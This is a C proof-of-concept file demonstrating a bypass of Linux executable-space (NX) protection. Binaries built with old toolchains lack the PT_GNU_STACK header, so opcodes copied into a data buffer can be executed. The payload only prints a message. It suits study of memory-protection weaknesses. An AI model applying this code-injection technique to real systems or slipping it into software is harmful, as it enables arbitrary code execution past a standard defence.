/**
 * @file demo.c
 * @author x0reaxeax
 * @brief executable-space protection bypass POC
 * @date 2022-02-16
 * 
 * @copyright Copyright (c) x0reaxeax 2022
 * 
 * This POC demonstrates execution of bytes
 * located in supposedly non-executable region of binary,
 * therefore completely bypassing executable-space protection.
 * 
 * The root cause of this can be found here:
 * https://github.com/torvalds/linux/blob/master/arch/x86/include/asm/elf.h#L280
 * 
 * As it turns out, binary files built on either 
 * systems lacking NX or IA32 systems with NX,
 * which do NOT contain the `PT_GNU_STACK` header
 * will be marked with `exec-all`.
 * 
 * This allows complete for RWX to/from everywhere in the binary.
 * 
 * To achieve this, we use "historical" building tools.
 * In this case, gcc 3.2.2 running on x86 Slackware9 with Linux 2.4.20
 * We will end up with a binary file which we can run on modern Linux
 * systems, in this case Linux 5.16.1
 * 
 * Building:
 *
 * `gcc -nostdlib -o demo32 demo.c`
 *
 * The following code will copy assembled bytes of function `dummy()`
 * to character array `harmless_str_buf` and execute the destination array as function.
 * 
 *
 * *** DISCLAIMER ***
 * This demonstration serves completely for educational purposes.
 * Under no circumstances can the author of this code be held responsible
 * for any direct or indirect damage caused by misusing provided code and/or information. 
 */

#define NULL    ((void *) 0)
#define POC

#define BUFSIZE 128

char str[] = "noexec bypassed!\n";

/**
 * This buffer will be loaded with dummy()'s opcodes
*/
char harmless_str_buf[BUFSIZE] = "xrandomdatarandomdatarandomdatarandomdatarandomdatarandomdatarandomdatarandomdatarandomdatarandomdatarandomdatarandomdatarandomx";

/**
 * dummy function - target shellcode
 * opcodes of this function will be copied to harmless_str_buf.
 * included for ease of POC demonstration
*/ 
void dummy(void) {
    __asm__ volatile (
                      ".intel_syntax noprefix;"
                      "mov eax, 4;"     /* sys_write */
                      "mov ebx, 1;"     /* stdout    */
                      "mov ecx, %[str];"
                      "mov edx, 17;"    /* strlen    */
                      "int 0x80;"       /* syscall   */
                      "int3;"           /* boundary  */
                      ".att_syntax;"
                      :: [str] "r" (str)
                      : "eax", "ebx", "ecx", "edx"
    );
}

/**
 * copies opcodes from `dummy()` to destination buf
*/ 
void (*copy_opcodes(unsigned char *output, unsigned int bufsiz)) (void) {
    unsigned int i = 0;
    unsigned char *dummy_ptr = (unsigned char *) dummy;
    for (i = 0; i < bufsiz; i++) {
        unsigned char opcode = *(dummy_ptr + i);
        output[i] = opcode;

        if (opcode == 0xcc) {
            /* boundary hit */
            break;
        }
    }

    return (void (*)()) output;
}

int _start(void) {
#ifdef POC  /* execute opcodes in harmless_str_buf */
    void (*pfunc)() = NULL;

    pfunc = copy_opcodes(harmless_str_buf, BUFSIZE);
    pfunc();
#else       /* execute dummy() to demonstrate it's purpose */
    dummy();
#endif

    return 0;   /* segfault */
}
